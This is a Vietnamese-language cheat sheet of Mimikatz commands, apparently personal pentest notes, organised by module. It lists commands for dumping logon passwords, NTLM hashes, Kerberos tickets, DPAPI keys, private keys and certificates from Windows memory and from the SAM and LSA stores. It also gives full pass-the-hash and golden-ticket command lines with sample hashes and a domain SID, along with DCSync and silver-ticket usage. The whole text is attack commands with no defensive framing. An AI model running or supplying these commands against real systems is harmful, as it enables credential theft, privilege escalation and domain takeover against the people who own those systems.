## Mimikatz

__#general__

`privilege::debug`: để truy cập thông tin nhạy cảm từ bộ nhớ hệ thống.
`log`: bắt đầu ghi log vào file mặc định (mimikatz.log)
`log customlogfilename.log`: khi log vào file cụ thể

__#sekurlsa__

`sekurlsa::logonpasswords`: trích xuất thông tin đăng nhập của các tài khoản đang đăng nhập trên hệ thống.
`sekurlsa::logonPasswords full`: chi tiết hơn
`sekurlsa::tickets /export`: xuất tất cả các Kerberos tickets từ bộ nhớ ra file `.kirbi`
`sekurlsa::pth`: Path-the-hash => Sử dụng NTLM hash của 1 tài khoản để xác thực mà không cần mật khẩu.
```
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

__#kerberos__

`kerberos::list /export`: liệt kê các kerberos ticket hiện tại và xuất chúng ra file `.kirbi`.
`kerberos::ptt c:\chocolate.kirbi`: Tải một vé Kerberos từ file chocolate.kirbi vào bộ nhớ để sử dụng.
`kerberos::golden`: Tạo golden ticket giả mạo 
```
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

__#crypto__

`crypto::capi`: Kiểm tra các key quản lý bởi CryptoAPI.
`crypto::cng`: Kiểm tra các key được quản lý bởi Crypto Next Generation (CNG).
`crypto::certificates /export`: xuất chứng chỉ từ kho lưu trữ người dùng.
`crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`: Xuất chứng chỉ từ kho lưu trữ của máy cục bộ.
`crypto::keys /export`: Xuất các private keys được quản lý bởi CryptoAPI.
`crypto::keys /machine /export`: Xuất các private keys thuộc về máy cục bộ.

__#vault & lsadump__

`vault::cred`: trích xuất thông tin đăng nhập từ Window Vault
`vault::list`: liệt kê các vault hiện tại trên máy
`token::elevate`: Tăng cấp quyền bằng cách sử dụng token bảo mật cao hơn.
`lsadump::sam`: Trích xuất thông tin tài khoản cục bộ từ SAM (Security Account Manager).
`lsadump::secrets`: Trích xuất secret keys từ LSA Secrets.
`lsadump::cache`: Trích xuất thông tin xác thực Kerberos được lưu trong bộ nhớ cache.
`lsadump::dcsync`: Mô phỏng hành vi của một Domain Controller để trích xuất hash của tài khoản domain (ví dụ: tài khoản krbtgt).

__#pth (Pass-the-Hash)__

`sekurlsa::pth`: Thực hiện xác thực mà không cần mật khẩu, chỉ dùng NTLM hash hoặc AES keys.

__#ekeys__

`sekurlsa::ekeys`: Liệt kê các encryption keys từ bộ nhớ của hệ thống.

__#dpapi__

`sekurlsa::dpapi`: Trích xuất các DPAPI keys (Data Protection API), cần thiết để giải mã dữ liệu được bảo vệ trên Windows.

__#minidump__

`sekurlsa::minidump lsass.dmp`: Tải file dump của tiến trình LSASS để phân tích ngoại tuyến.

__#ptt__

`kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi`: Tải 1 vé kergeros cụ thế vào bộ nhớ.

__#golden/silver__
`kerberos::golden`

Tạo Golden Ticket để có quyền truy cập domain.
Tùy chọn bổ sung:
- /id: Xác định RID (Relative ID).
- /groups: Gán nhóm cho vé.

__kerberos::silver__

Tạo Silver Ticket, chỉ có hiệu lực với một dịch vụ cụ thể.

__#tgt__

`kerberos::tgt`: Trích xuất Ticket Granting Ticket (TGT) từ bộ nhớ.

__#purge__

`kerberos::purge`: Xóa tất cả vé Kerberos khỏi bộ nhớ.